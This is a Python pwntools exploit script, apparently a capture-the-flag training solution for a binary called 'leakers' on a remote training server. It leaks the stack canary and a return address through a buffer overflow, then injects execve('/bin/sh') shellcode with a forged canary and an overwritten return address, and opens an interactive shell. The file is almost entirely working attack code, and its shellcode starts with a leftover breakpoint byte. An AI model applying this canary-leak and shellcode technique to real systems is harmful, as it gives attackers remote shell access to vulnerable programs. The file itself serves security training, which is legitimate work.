#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#r = process("./leakers")
#gdb.attach(r, """
#	c
#	""")

r = remote("training.jinblack.it", 2011)
input("wait")

r.send(b"A" * 104 + b"B")		#104 to fill the buffer and 1 to skip the leading 0 of the canary
time.sleep(0.1)

#separate the different parts of what we are receiving
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))	#canary is what leaked plus a leading zero (here we then convert it to an integer with u64)

print("0x%x" % canary)

r.send(b"A" * 136)		
time.sleep(0.1)

r.recvuntil("> ")
r.recv(136)
ret = u64(r.recv(6) + b"\x00"+ b"\x00")

wheretojump = ret - 0x158

print("0x%x" % wheretojump)

shellcode = b"\xcc\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
shellcode = shellcode.ljust(104, b"A")

#p64 inverse of u64: transforms an integers in string
payload = shellcode + p64(canary) + b"B"*8 + p64(wheretojump)  #adding 8 bytes between canary and where because canary is before the base pointer so we overwrite it to then write the saved instruction pointer

r.send(payload)
time.sleep(0.1)		#added to make sure inputs doesn't merge toghether

r.interactive()